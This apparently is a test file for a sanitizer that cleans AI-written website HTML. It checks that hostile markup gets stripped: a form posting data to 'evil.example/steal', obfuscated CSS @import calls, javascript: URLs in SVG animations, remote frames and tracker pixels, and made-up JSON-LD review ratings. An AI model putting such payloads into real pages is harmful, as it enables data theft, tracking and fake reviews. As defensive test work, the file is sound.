import { describe, expect, it } from "vitest";

import { consentBanner, fillIntegrations, netlifyForms, seoHead, stripActiveContent, stripActiveContentInPage, type TrackingConfig } from "@tawd/core/site";

/*
  Audit F-011 (12 November 2026): the cleaner for AI-written page HTML is an
  allow-list, not a block-list. Each case below was kept unchanged by the
  old cleaner and is taken out now.
*/

describe("what the cleaner no longer keeps", () => {
  it("a frame to a host that is not TAWD's own", () => {
    expect(stripActiveContent('<p>a</p><iframe src="https://evil.example/x"></iframe><p>b</p>')).toBe("<p>a</p><p>b</p>");
  });

  it("a form that posts to another site", () => {
    const out = stripActiveContent('<form action="https://evil.example/steal" method="post"><input name="email"></form>');
    expect(out).not.toContain("evil.example");
    expect(out).toContain("<form");
    expect(out).toContain('<input name="email">');
  });

  it("a base tag", () => {
    expect(stripActiveContent('<base href="https://evil.example/"><p>a</p>')).toBe("<p>a</p>");
  });

  it("a meta refresh", () => {
    expect(stripActiveContent('<meta http-equiv="refresh" content="0;url=https://evil.example"><p>a</p>')).toBe("<p>a</p>");
  });

  it("a remote style sheet", () => {
    expect(stripActiveContent('<link rel="stylesheet" href="https://evil.example/a.css"><p>a</p>')).toBe("<p>a</p>");
  });

  it("an @import and a remote url() in a style block", () => {
    const out = stripActiveContent('<style>@import url("https://evil.example/a.css"); .a{background:url(https://evil.example/p.png)} .b{color:red}</style>');
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("@import");
    expect(out).toContain(".b{color:red}");
  });

  it("an @import written with escapes and comments", () => {
    expect(stripActiveContent("<style>.a{background:u\\72l(https://evil.example/p.png)}</style>")).not.toContain("evil.example");
    expect(stripActiveContent("<style>@im/**/port 'https://evil.example/a.css';</style>")).not.toContain("evil.example");
  });

  it("a remote url() or expression() in a style attribute", () => {
    expect(stripActiveContent('<div style="background:url(https://evil.example/p.png);color:red">x</div>')).not.toContain("evil.example");
    expect(stripActiveContent('<div style="width:expression(alert(1))">x</div>')).not.toContain("expression(");
  });

  it("an object and an embed", () => {
    expect(stripActiveContent('<object data="https://evil.example/a.swf"></object><embed src="https://evil.example/a.swf"><p>a</p>')).toBe("<p>a</p>");
  });

  it("a remote picture, which would load before the visitor's consent", () => {
    const out = stripActiveContent('<img src="https://tracker.example/p.gif" alt="x"><img srcset="https://tracker.example/p.gif 2x" alt="y">');
    expect(out).not.toContain("tracker.example");
    expect(out).toContain('alt="x"');
  });

  it("an SVG animation with a javascript: value", () => {
    const out = stripActiveContent('<svg viewBox="0 0 10 10"><a><animate attributeName="href" values="javascript:alert(1)"/><set attributeName="href" to="javascript:alert(1)"/><circle r="2"/></a></svg>');
    expect(out).not.toContain("javascript:");
    expect(out).not.toContain("<animate");
    expect(out).not.toContain("<set");
    expect(out).toContain('<circle r="2"/>');
  });

  it("an SVG foreignObject", () => {
    expect(stripActiveContent('<svg><foreignObject><iframe src="https://evil.example"></iframe></foreignObject><path d="M0 0"/></svg>')).toBe('<svg><path d="M0 0"/></svg>');
  });

  it("JSON-LD the model wrote, with a rating nobody gave", () => {
    const html = '<p>a</p><script type="application/ld+json">{"@type":"LocalBusiness","aggregateRating":{"ratingValue":5,"reviewCount":999}}</script>';
    expect(stripActiveContent(html)).toBe("<p>a</p>");
  });

  it("a JSON-LD script that loads from an address", () => {
    expect(stripActiveContent('<p>a</p><script type="application/ld+json" src="https://evil.example/x.js"></script>')).toBe("<p>a</p>");
  });

  it("a javascript: link is still turned into #, and handlers still go", () => {
    expect(stripActiveContent('<a href="javascript:alert(1)" onclick="x()">Go</a>')).toBe('<a href="#">Go</a>');
  });

  it("an unknown tag, but not its words", () => {
    expect(stripActiveContent("<p>a <blink>b</blink></p>")).toBe("<p>a b</p>");
  });

  it("a conditional comment and an unclosed style cannot carry a rule out", () => {
    expect(stripActiveContent('<p>a</p><style>.a{background:url(https://evil.example/p.png)}')).not.toContain("evil.example");
  });
});

describe("what a TAWD page keeps", () => {
  it("leaves headings, sections, pictures, links and styles as they were", () => {
    const html =
      '<section class="hero" id="top"><h1>Plumbing in Sacramento</h1><p class="lead" style="color:#123;margin:0">Call us</p><img src="/images/hero.jpg" alt="Van" width="800" height="400" loading="lazy">' +
      '<img src="tawd-asset:photo-1" alt=""><img src="data:image/png;base64,AAA" alt=""><a href="/contact/" class="btn">Contact</a><a href="https://maps.example/x" rel="noopener">Map</a><a href="tel:+19162357878">Call</a>' +
      '<ul><li>One</li></ul><div style="background:url(/images/bg.jpg)"></div><table><tr><td colspan="2">x</td></tr></table></section>';
    expect(stripActiveContent(html)).toBe(html);
  });

  it("keeps Google Fonts links and a Google Fonts @import", () => {
    const html =
      '<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>' +
      '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter&display=swap"><link rel="stylesheet" href="/site.css"><style>@import url("https://fonts.googleapis.com/css2?family=Inter");.a{font-family:Inter}</style>';
    expect(stripActiveContent(html)).toBe(html);
  });

  it("keeps an inline icon, with a local use and a gradient", () => {
    const html =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient><clipPath id="c"><rect width="24" height="24"/></clipPath></defs>' +
      '<title>Phone</title><g clip-path="url(#c)" fill="url(#g)"><path d="M1 1h2" stroke-width="2"/><circle cx="1" cy="1" r="1"/><line x1="0" y1="0" x2="1" y2="1"/><polyline points="0,0 1,1"/><polygon points="0,0 1,1 2,0"/><ellipse cx="1" cy="1" rx="1" ry="2"/></g><use href="#g"/></svg>';
    expect(stripActiveContent(html)).toBe(html);
  });

  it("keeps a form TAWD wrote (Netlify's attributes, the thank-you page)", () => {
    const form = netlifyForms('<form class="quote"><label>Name <input name="name" required></label><textarea name="message"></textarea><button type="submit">Send</button></form>');
    expect(form).toContain('action="/thank-you/"');
    expect(stripActiveContent(form)).toBe(form);
  });

  it("keeps the booking frame TAWD fills in itself", () => {
    const main = fillIntegrations('<div data-tawd-integration="b1"></div>', [{ id: "b1", kind: "booking", provider: "Calendly", url: "https://calendly.com/acme/visit", embed: true }]);
    expect(main).toContain("<iframe");
    expect(stripActiveContent(main)).toBe(main);
  });

  it("puts TAWD's own JSON-LD in the head after the cleaning, and the cleaning never sees it", () => {
    const facts = { name: "Acme Plumbing", phone: "(916) 235-7878", email: "", streetAddress: "1 Main St", city: "Sacramento", state: "CA", isServiceAreaBusiness: false, domain: "acme.test", trade: "plumbing", areaServed: [], logoPath: null };
    const head = seoHead({ facts, path: "/", kind: "home", title: "Acme", description: "Plumbers" });
    expect(head).toContain("application/ld+json");
    expect(head).not.toContain("aggregateRating");
    // The build cleans the page's header, main and footer, then adds this head: the cleaner is never given it.
    expect(stripActiveContent('<main><script type="application/ld+json">{"aggregateRating":{}}</script></main>')).toBe("<main></main>");
  });

  it("still leaves the whole-page consent banner and a cleaned page's head alone", () => {
    const banner = consentBanner({ consentMode: "opt_in" } as TrackingConfig, { floor: "opt_out", honorGpc: false, symmetricalButtons: true, optOutHonoredNotice: false, privacyChoicesLink: false });
    const page = `<html><head><script type="application/ld+json">{"a":1}</script></head><body><main><iframe src="https://evil.example"></iframe></main>${banner}</body></html>`;
    const out = stripActiveContentInPage(page, [banner]);
    expect(out).toContain(banner);
    expect(out).toContain('<script type="application/ld+json">{"a":1}</script>');
    expect(out).not.toContain("evil.example");
  });
});
